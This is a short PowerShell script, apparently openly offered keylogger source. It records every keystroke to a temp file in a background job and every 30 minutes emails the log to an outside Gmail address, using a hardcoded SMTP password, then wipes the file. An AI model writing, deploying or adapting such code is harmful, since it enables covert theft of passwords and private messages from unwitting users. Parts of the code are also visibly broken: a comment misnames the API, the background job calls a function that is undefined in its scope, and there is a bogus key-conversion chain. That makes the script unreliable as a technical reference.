function Get-Keystrokes {
    [CmdletBinding()]
    param(
        [string]$LogPath = "$env:TEMP\keylog.txt"
    )
    
    # Signature for the SetWindowsHookEx API call
    $signature = @"
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
    
    # Load the API
    $API = Add-Type -MemberDefinition $signature -Name "Win32" -PassThru
    
    # Create an endless loop
    while ($true) {
        Start-Sleep -Milliseconds 40
        # Scan all ASCII codes
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            # Get the state of the key
            $state = $API::GetAsyncKeyState($ascii)
            
            # If the key is pressed
            if ($state -eq -32767) {
                $key = [System.Windows.Forms.Keys]::$ascii
                $virtualKey = [System.Windows.Input.KeyInterop]::VirtualKeyFromKey($key)
                
                # Convert to char
                if ([System.Windows.Input.Keyboard]::IsKeyDown($key)) {
                    $logged = [System.Windows.Input.Keyboard]::PrimaryDevice.ActiveSource.InputManager.ProcessInput(
                        [System.Windows.Input.KeyEventArgs]::FromKeyboardDevice(
                            [System.Windows.Input.Keyboard]::PrimaryDevice,
                            [System.Windows.Input.PresentationSource]::FromVisual($this),
                            0,
                            $virtualKey
                        )
                    )
                    
                    $char = $logged.Key.ToString()
                    if ($char -eq "Return") { $char = "`r`n" }
                    if ($char -eq "Space") { $char = " " }
                    
                    # Add timestamp
                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    "$timestamp - $char" | Out-File -FilePath $LogPath -Append
                }
            }
        }
    }
}

# Start the keylogger in the background
Start-Job -ScriptBlock { Get-Keystrokes }

# Email function
function Send-Keylog {
    param(
        [string]$From = "system@local.host",
        [string]$To = "hankdahacker@gmail.com",
        [string]$Subject = "Keylog Report",
        [string]$LogPath = "$env:TEMP\keylog.txt",
        [string]$Password = "uvjvdwspjqaapayz"
    )
    
    $body = Get-Content $LogPath | Out-String
    
    Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential($To, (ConvertTo-SecureString $Password -AsPlainText -Force)))
    
    # Clear the log after sending
    Clear-Content $LogPath
}

# Schedule the email every 30 minutes
while ($true) {
    Start-Sleep 1800
    Send-Keylog
}
